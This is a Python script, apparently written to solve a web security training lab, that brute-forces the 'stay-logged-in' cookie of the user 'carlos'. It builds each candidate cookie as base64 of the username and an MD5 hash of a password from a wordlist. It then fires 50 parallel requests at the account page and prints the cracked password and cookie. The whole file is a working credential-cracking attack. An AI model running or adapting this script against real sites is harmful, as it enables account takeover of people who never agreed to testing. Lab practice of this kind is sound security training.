import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import base64
import os

# if running the script repeatedly, hard code the URL here for convenience
# otherwise, you'll need to provide the URL in the terminal when running the program
baseWebsiteUrl = ""

getLoginPageUrl = lambda: baseWebsiteUrl + "/login"
getAccountPageUrl = lambda: baseWebsiteUrl + f"/my-account?id={targetUsername}"

targetUsername = "carlos"
targetCookieId = "stay-logged-in"

print("\n\n\n==== PROGRAM START ====\n")
baseWebsiteUrl = baseWebsiteUrl if baseWebsiteUrl else input("Enter the lab URL:\n").strip().rstrip('/')

print("Testing connection to target url...")
try:
    response = requests.get(baseWebsiteUrl, timeout=10)
    response.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"ERROR! Could not connect to [{baseWebsiteUrl}]: {e}")
    exit(1)

# open the passwords.txt file to get a list of candidate passwords
script_dir = os.path.dirname(os.path.abspath(__file__))
passwords_path = os.path.join(script_dir, "passwords.txt")
if not os.path.exists(passwords_path):
    print(f"ERROR! Could not find passwords file at [{passwords_path}]")
    exit(1)
with open(passwords_path, "r") as f:
    passwords = [line.strip() for line in f.readlines()]
print(f"Passwords loaded: {len(passwords)}")

def GetStayLoggedInCookieValue(password):
    hashedPassword = hashlib.md5(password.encode()).hexdigest()
    decoded = f"{targetUsername}:{hashedPassword}"
    encoded = base64.b64encode(decoded.encode()).decode()
    return encoded

def AttemptLoginWithPassword(password, url):
    encoded = GetStayLoggedInCookieValue(password)
    try:
        s = requests.Session()
        s.cookies.set(targetCookieId, encoded)
        response = s.post(f"{url}", allow_redirects=False)
        if (response.status_code == 200):
            return password
    except requests.exceptions.RequestException:
        return None
    return None

# use multithreading to speed this up significantly
executor = ThreadPoolExecutor(max_workers=50)
futures = []
completedCount = 0

# queue up and begin firing off separate threads, each attempting one password
for password in passwords:
    future = executor.submit(AttemptLoginWithPassword, password, getAccountPageUrl())
    futures.append(future)

# examine the results of each completed thread
for future in as_completed(futures):
    result = future.result()
    if result:
        printouts = [
            "\n= CRACKING SUCCESSFUL =", 
            f"password: {result}",
            f"{targetCookieId}: {GetStayLoggedInCookieValue(result)}",
            f"target url: {getAccountPageUrl()}",
            "\n==== EXITING PROGRAM ====\n"
        ]
        print("\n".join(printouts))
        os._exit(0) # needed to exit cleanly from the multithreading
    else:
        completedCount += 1
    print(f"Passwords checked: {completedCount:3} / {len(passwords)}", end="\r")

print("\nCracking failed :(")